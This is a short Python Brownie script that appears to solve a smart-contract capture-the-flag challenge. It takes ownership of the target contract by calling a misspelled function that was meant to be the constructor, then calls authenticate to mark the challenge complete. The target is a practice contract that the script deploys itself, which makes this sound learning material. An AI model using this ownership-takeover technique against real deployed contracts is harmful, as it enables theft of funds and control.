#!/usr/bin/python3
from brownie import web3
from colorama import Fore
from eth_account._utils.legacy_transactions import \
    serializable_unsigned_transaction_from_dict
from eth_account._utils.signing import to_standard_v
from eth_keys.datatypes import Signature
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * https://ethereum.stackexchange.com/questions/13778/get-public-key-of-any-ethereum-account


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, owner = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # * constructor name is mispelled. just call AssumeOwmershipChallenge then authenticate
    take_ownership = target.AssumeOwmershipChallenge({"from": attacker})
    take_ownership.wait(1)

    authenticate = target.authenticate({"from": attacker})
    authenticate.wait(1)

    assert target.isComplete() == True
    print_colour(target.isComplete())


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
